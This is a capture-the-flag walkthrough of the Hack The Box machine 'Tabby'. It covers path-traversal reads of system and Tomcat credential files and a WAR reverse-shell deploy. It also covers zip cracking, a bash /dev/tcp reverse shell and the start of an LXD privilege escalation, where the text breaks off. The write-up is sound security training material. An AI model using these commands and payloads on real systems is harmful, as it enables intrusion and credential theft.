# Tabby

- Linux
- Web application

## Recon

Hosting provider.

PHP website.

News link has potential vulnerability.
```
http://megahosting.htb/news.php?file=statement
```

No robots file, no sitemap.

Nmap
----

3 services open.

- 22 SSH
- 80 HTTP
- 8080 HTTP (Tomcat default)

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/tabby$ nmap -A -T5 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 12:28 BST
Nmap scan report for 10.10.10.194
Host is up (0.012s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

GoBuster enumeration
-----

Port 80 (host page) enumeration

```
/assets (Status: 403)
    /images (Status: 403)
    /css (Status: 403)
    /js (Status: 403)
    /fonts (Status: 403)
/favicon.ico (Status: 200)
/files (Status: 301)
    /archive (Status: 403)
    /statement (Status: 200)
/index.php (Status: 200)
```

```

Port 8080 (tomcat install enumeration)
----
```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/tabby$ gobuster dir -u http://10.10.10.194:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.194:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/27 12:37:26 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/host-manager (Status: 302)
/index.html (Status: 200)
/manager (Status: 302)
===============================================================
2020/09/27 12:37:32 Finished
===============================================================
```

Port 80, /files, /assets
-----

These directories looked interesting.
But, both redirect to 403 forbidden pages, despite GoBuster enumeration.

Testing potential LFI vuln 
----

News link uses GET parameter input to include files.

```shell
http://megahosting.htb/news.php?file=statement
```

To exploit, we should add a line to /etc/hosts.
```
10.10.10.X  megahosting.htb
```

Now on browsing to site we see the message
```
We apologise to all our customers for the previous data breach.
We have changed the site to remove this tool, and have invested heavily in more secure servers
```

LFI exploit: 
http://megahosting.htb/news.php?file=/../../../../etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin 
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin 
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin 
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin 
syslog:x:104:110::/home/syslog:/usr/sbin/nologin 
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin 
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false 
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin 
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin 
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin 
pollinate:x:110:1::/var/cache/pollinate:/bin/false 
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin 
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin 
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false 
tomcat:x:997:997::/opt/tomcat:/bin/false 
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false 
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Found users
- `ash`
- `root`

Found services from users
- mysql
- lxd
- tomcat

Can't pull shadow file.
```
http://megahosting.htb/news.php?file=/../../../../etc/shadow
```

Can't pull ash SSH file.

```
http://megahosting.htb/news.php?file=/../../../../home/ash/.ssh/id_rsa
```

Can't pull user.txt from ash.

```
http://megahosting.htb/news.php?file=/../../../../home/ash/user.txt
```

Can't Hydra brute SSH; only allows public key login.

Try to LFI more by Fuzzing potential files.

```
kali@kali:~$ wfuzz -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hc 403,404 -u http://megahosting.htb/news.php?file=../../../../FUZZ | grep -v '0 Ch'

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://megahosting.htb/news.php?file=../../../../FUZZ
Total requests: 257

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                   
===================================================================

000000005:   200        227 L    1114 W   7237 Ch     "/etc/apache2/apache2.conf"                                                                                                                                               
000000018:   200        10 L     76 W     473 Ch      "/etc/fstab"                                                                                                                                                              
000000024:   200        10 L     27 W     246 Ch      "/etc/hosts"                                                                                                                                                              
000000025:   200        10 L     57 W     411 Ch      "/etc/hosts.allow"                                                                                                                                                        
000000026:   200        17 L     111 W    711 Ch      "/etc/hosts.deny"                                                                                                                                                         
000000038:   200        2 L      5 W      24 Ch       "/etc/issue"                                                                                                                                                              
000000044:   200        4 L      6 W      102 Ch      "/etc/lsb-release"                                                                                                                                                        
000000048:   200        38 L     228 W    2725 Ch     "/etc/mtab"                                                                                                                                                               
000000052:   200        10 L     29 W     283 Ch      "/etc/network/interfaces"                                                                                                                                                 
000000053:   200        2 L      12 W     91 Ch       "/etc/networks"                                                                                                                                                           
000000070:   200        27 L     97 W     581 Ch      "/etc/profile"                                                                                                                                                            
000000080:   200        18 L     113 W    708 Ch      "/etc/resolv.conf"                                                                                                                                                        
000000083:   200        52 L     217 W    1603 Ch     "/etc/ssh/ssh_config"                                                                                                                                                     
000000084:   200        124 L    398 W    3299 Ch     "/etc/ssh/sshd_config"                                                                                                                                                    
000000086:   200        1 L      3 W      601 Ch      "/etc/ssh/ssh_host_dsa_key.pub"                                                                                                                                           
000000105:   200        31 L     55 W     367 Ch      "/proc/filesystems"                                                                                                                                                       
000000104:   200        56 L     376 W    2194 Ch     "/proc/cpuinfo"                                                                                                                                                           
000000106:   200        69 L     464 W    4292 Ch     "/proc/interrupts"                                                                                                                                                        
000000107:   200        58 L     216 W    1537 Ch     "/proc/ioports"                                                                                                                                                           
000000108:   200        53 L     155 W    1475 Ch     "/proc/meminfo"                                                                                                                                                           
000000109:   200        55 L     330 W    2917 Ch     "/proc/modules"                                                                                                                                                           
000000110:   200        38 L     228 W    2725 Ch     "/proc/mounts"                                                                                                                                                            
000000111:   200        10 L     497 W    1198 Ch     "/proc/stat"                                                                                                                                                              
000000112:   200        2 L      10 W     96 Ch       "/proc/swaps"                                                                                                                                                             
000000113:   200        1 L      17 W     144 Ch      "/proc/version"                                                                                                                                                           
000000114:   200        2 L      15 W     158 Ch      "/proc/self/net/arp"                                                                                                                                                      
000000188:   200        0 L      1 W      32032 Ch    "/var/log/faillog"                                                                                                                                                        
000000224:   200        0 L      3 W      1151 Ch     "/var/run/utmp"
000000180:   200        1253 L   12594W    98084 Ch    "/var/log/dmesg" 
000000220:   200        58 L     120 W    76387 Ch    "/var/log/wtmp"                  
000000199:   200        0 L      1 W      292292 Ch   "/var/log/lastlog"                                                                                                                                                        

Total time: 0.624577
Processed Requests: 257
Filtered Requests: 0
Requests/sec.: 411.4784

```

Digging into fuzzed LFI responses
----

- /var/log/dmesg

    Large file, tell us OS and more about hardware.
    ```
    [    0.000000] kernel: Linux version 5.4.0-31-generic (buildd@lgw01-amd64-059) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 (Ubuntu 5.4.0-31.35-generic 5.4.34)
    [    0.000000] kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-5.4.0-31-generic root=UUID=0aadaa55-9138-4c0d-b1dc-fe8a382110f0 ro maybe-ubiquity
    ```

- 
    SSH dsa host public key. 
    `root` user. Potential system name `bungle`?

    ```
    ssh-dss AAAAB3NzaC1kc3MAAACBALswqzCHX6kxY8OGSJ52JAEk5Bd1DSuaUttSQssAGA77g55z65MFczdVQ9E/VOcA0K4CvY+snTqk2Bd8taj1YSr99N2LQWPQNScPLwPGEvcUwkjxOmvtKRFBX6mgDqr/rlqjkJES+tP66RAyT6wFuuer48gzyPi8NKD9mRC4D87fAAAAFQDofXrxYboK2o+4WZxx8GZdYA9g9QAAAIEAmNKSjPoV4OuGZGU18FrS0InKnGXkxJchQ3fMnKTpGMAk+CF8GahYJ6ZJqHqqiAjsKF3G8gDdA+6mrBNFQIksLSxSg/136UzZS9beKPYxoWR7y9w0FseqbFrHf6Zubt+rbFRNtEdOorc6F0d52mbnsa0MC2v2YjFlH5KS7t/Wq7IAAACBAKhhC1oRFdi07dHJF+2YG1UwYSm7rFEDqOuXsTj9gZWNDIgOVOztE344phv9SXe21IOHCMNmq3jyU3JRNAn9Mr1CbnDYRIzm7xyXbJXfubbP3OeWBLtj78d9THncAMumjV6aPvG45U5L4XS8YmYyqmmztftD5WRzdLDsfG5UuLbB root@bungle
    ```

- /etc/hosts
    
    Hosts file, nothing special

    ```
    127.0.0.1 localhost
    127.0.1.1 tabby
    127.0.0.1 megahosting.com
    ```

## Referring back to tomcat

Tomcat is version 9.

Tomcat homepage states: `etc/tomcat9/tomcat-users.xml` contains tomcat users.
Unable to LFI this.

$CATALINA_BASE is: `/usr/share/tomcat9`
$CATALINE_HOME IS: `/var/lib/tomcat9`

Check [tomcat package](https://packages.debian.org/sid/all/tomcat9/filelist) to see what files are included.

Found that server is ubuntu earlier. Potentially maintained default install location.

```
/etc/cron.daily/tomcat9
/etc/rsyslog.d/tomcat9.conf
/etc/tomcat9/policy.d/01system.policy
/etc/tomcat9/policy.d/02debian.policy
/etc/tomcat9/policy.d/03catalina.policy
/etc/tomcat9/policy.d/04webapps.policy
/etc/tomcat9/policy.d/50local.policy
/lib/systemd/system/tomcat9.service
/usr/lib/sysusers.d/tomcat9.conf
/usr/lib/tmpfiles.d/tomcat9.conf
/usr/libexec/tomcat9/tomcat-start.sh
/usr/libexec/tomcat9/tomcat-update-policy.sh
/usr/share/doc/tomcat9/README.Debian
/usr/share/doc/tomcat9/changelog.Debian.gz
/usr/share/doc/tomcat9/copyright
/usr/share/tomcat9-root/default_root/META-INF/context.xml
/usr/share/tomcat9-root/default_root/index.html
/usr/share/tomcat9/default.template
/usr/share/tomcat9/etc/catalina.properties
/usr/share/tomcat9/etc/context.xml
/usr/share/tomcat9/etc/jaspic-providers.xml
/usr/share/tomcat9/etc/logging.properties
/usr/share/tomcat9/etc/server.xml
/usr/share/tomcat9/etc/tomcat-users.xml
/usr/share/tomcat9/etc/web.xml
/usr/share/tomcat9/logrotate.template
/var/lib/tomcat9/conf
/var/lib/tomcat9/logs
/var/lib/tomcat9/work
```

Found potential `tomcat-users.xml` file.

## Pulling tomcat users
```xml
<!-- view-source:http://megahosting.htb/news.php?file=../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml -->
 <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

We find password for tomcat admin GUI.

## Login to tomcat admin

Get acccess to: http://megahosting.htb:8080/host-manager/html

Use credentials:
```
tomcat:$3cureP4s5w0rd123!
```
Find more information about server: http://megahosting.htb:8080/manager/status?org.apache.catalina.filters.CSRF_NONCE=E49FAA6C2E110DAC1F711898D5A018B3

```
Tomcat Version: Apache Tomcat/9.0.31 (Ubuntu) 	
JVM Version: 11.0.7+10-post-Ubuntu-3ubuntu1 	
JVM Vendor: Ubuntu 	
OS Name: Linux 	
OS Version:5.4.0-31-generic 	
OS Architecture: amd64 	
Hostname: tabby 	
IP Address: 127.0.1.1
```

## Exploiting manager-script role

We can't use metasploit exploits because we dont have access to `/manager/html` directory for `upload` nor `deploy`.

[Article on exploiting manager-script role in tomcat](https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00).

However, we have access to `/manager/text`.

1. Generate an **MSFVenom payload** in Java (tomcat is java based)
    ```shell
    $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.36 LPORT=4443 -f war > loveless.war
    ```
2. **Upload payload** via `/manager/text` with curl.
    Make sure to escape the '$' when running bash.. '\$'...
    ```shell
    $ curl -v -u 'tomcat':'$3cureP4s5w0rd123!' --upload-file loveless.war "http://megahosting.htb:8080/manager/text/deploy?path=/loveless"
    ```
3. **Start netcat** listener locally
    ```shell
    $ nc -nvlp 4443
    ```
4. **Execute payload** deployed to tomcat
    ```shell
    $ curl -v -u 'tomcat':'$3cureP4s5w0rd123!' http://megahosting.htb:8080/loveless/
    ```

## Getting shell 

After executing payload, you should get shell as tomcat.

```shell
$ nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.194] 38498
whoami
tomcat
```

## Find files

Went to lock for files to LFI in /var/www/html.

In /files there are some files that weren't found in earlier LFI enumeration.

```shell
drwxr-xr-x 4 ash  ash  4.0K Jun 17 21:59 .
drwxr-xr-x 4 root root 4.0K Jun 17 16:24 ..
-rw-r--r-- 1 ash  ash  8.6K Jun 16 13:42 16162020_backup.zip
drwxr-xr-x 2 root root 4.0K Jun 16 20:13 archive
drwxr-xr-x 2 root root 4.0K Jun 16 20:13 revoked_certs
-rw-r--r-- 1 root root 6.4K Jun 16 11:25 statement
```

## Crack backup .zip

Download 16162020_backup.zip.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/tabby$ unzip 16162020_backup.zip 
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password: 
   skipping: var/www/html/favicon.ico  incorrect password
   creating: var/www/html/files/
   skipping: var/www/html/index.php  incorrect password
   skipping: var/www/html/logo.png   incorrect password
   skipping: var/www/html/news.php   incorrect password
   skipping: var/www/html/Readme.txt  incorrect password
```

Password protected; try to crack with john.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/tabby$ sudo zip2john 16162020_backup.zip > 16162020_backup.hash

kali@kali:~/Desktop/repos/ctf/hack-the-box/tabby$ john 16162020_backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)
1g 0:00:00:02 DONE (2020-09-27 20:54) 0.4237g/s 4391Kp/s 4391Kc/s 4391KC/s adnc153..adenabuck
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Password is `admin@it`; try to unzip with password

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/tabby$ unzip 16162020_backup.zip 
Archive:  16162020_backup.zip
[16162020_backup.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt  
```

## Reading old files

... Nothing really useful here.
Though we do get a glimpse at some files, and a potentially reused password?

## Get user shell

Try switch user to ash.

We get ash's user.

```shell
su ash
admin@it

whoami
ash
```

## Get user flag

```
cd ~
ls -lah
total 28K
drwxr-x--- 3 ash  ash  4.0K Jun 16 13:59 .
drwxr-xr-x 3 root root 4.0K Jun 16 13:32 ..
lrwxrwxrwx 1 root root    9 May 21 20:32 .bash_history -> /dev/null
-rw-r----- 1 ash  ash   220 Feb 25  2020 .bash_logout
-rw-r----- 1 ash  ash  3.7K Feb 25  2020 .bashrc
drwx------ 2 ash  ash  4.0K May 19 11:48 .cache
-rw-r----- 1 ash  ash   807 Feb 25  2020 .profile
-rw-r----- 1 ash  ash     0 May 19 11:48 .sudo_as_admin_successful
-rw-r----- 1 ash  ash    33 Sep 27 19:47 user.txt
cat user.txt
be015e5b39eeabacacf0e293001e9528
```

# Upgrade shell

Generated MSFVenom payload

```
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.36 LPORT=4445 -f raw
0<&58-;exec 58<>/dev/tcp/10.10.14.36/4445;sh <&58 >&58 2>&58
```
Ran metasploit listener

```
msfconsole
use exploit/multi/handler
set lport 4445
set lhost tun0
run
```

Ran on msfvenom on victim machine. Got shell.

Then used `post/multi/manage/shell_to_meterpreter`, dropped back into `shell`. Then, ran `python3 -c 'import pty; pty.spawn("/bin/sh")'` for interactive shell.

## Check for privesc vectors

Can't run as sudo on machine.

```
$ sudo -l
sudo -l
sudo: unable to open /run/sudo/ts/ash: Read-only file system
[sudo] password for ash: admin@it

Sorry, user ash may not run sudo on tabby.
```

Ash is in `lxd` group, so can run linux containers.

```
groups
ash adm cdrom dip plugdev lxd
```

Ash cannot init lxd.

Ash can run `lxc` privesc. That can be exploited: https://www.hackingarticles.in/lxd-privilege-escalation/

## Get LXC image onto victim machine

No images in lxc list.

```
lxc list
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

Clone alpine builder; fix builder; build alpine.

```
# Clone
$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
$ sudo ./build-alpine 

# Realise it's broken and fix mirrors
$ wget http://dl-cdn.alpinelinux.org/alpine/MIRRORS.txt
$ sudo mkdir /usr/share/alphine-mirrors/
$ cp /usr/share/alpine-mirrors/MIRRORS.txt MIRRORS.txt
$ sudo ./build-alpine

# Starts to download..

Determining the latest release... v3.12
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk
...
(17/19) Installing libc-utils (0.7.2-r3)
(18/19) Installing alpine-keys (2.2-r0)
(19/19) Installing alpine-base (3.12.0-r0)
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB in 19 packages
```

Create python server to upload image to victim
```shell
kali@kali:~/Desktop/repos/ctf/tools/lxd-alpine-builder$ ls -lah
total 3.2M
drwxr-xr-x 3 kali kali 4.0K Sep 27 21:46 .
drwxr-xr-x 5 kali kali 4.0K Sep 27 21:38 ..
-rw-r--r-- 1 root root 3.1M Sep 27 21:46 alpine-v3.12-x86_64-20200927_2146.tar.gz
-rwxr-xr-x 1 kali kali 7.4K Sep 27 21:46 build-alpine
drwxr-xr-x 8 kali kali 4.0K Sep 27 21:38 .git
-rw-r--r-- 1 kali kali  26K Sep 27 21:38 LICENSE
-rw-r--r-- 1 kali kali 1.8K Sep 26 23:00 MIRRORS.txt
-rw-r--r-- 1 kali kali  768 Sep 27 21:38 README.md
kali@kali:~/Desktop/repos/ctf/tools/lxd-alpine-builder$ python3 -m http.server
```

Download lxd image with victim shell.
```
ash@tabby:~$ mkdir alpine
mkdir alpine
ash@tabby:~$ cd alpine
cd alpine
ash@tabby:~/alpine$ wget http://10.10.14.36:8000/alpine-v3.12-x86_64-20200927_2146.tar.gz
<14.36:8000/alpine-v3.12-x86_64-20200927_2146.tar.gz
--2020-09-27 21:11:04--  http://10.10.14.36:8000/alpine-v3.12-x86_64-20200927_2146.tar.gz
Connecting to 10.10.14.36:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3207041 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200927_2146.tar.gz’

alpine-v3.12-x86_64 100%[===================>]   3.06M   731KB/s    in 4.3s    

2020-09-27 21:11:09 (731 KB/s) - ‘alpine-v3.12-x86_64-20200927_2146.tar.gz’ saved [3207041/3207041]
```

## LXD privesc after downloading image




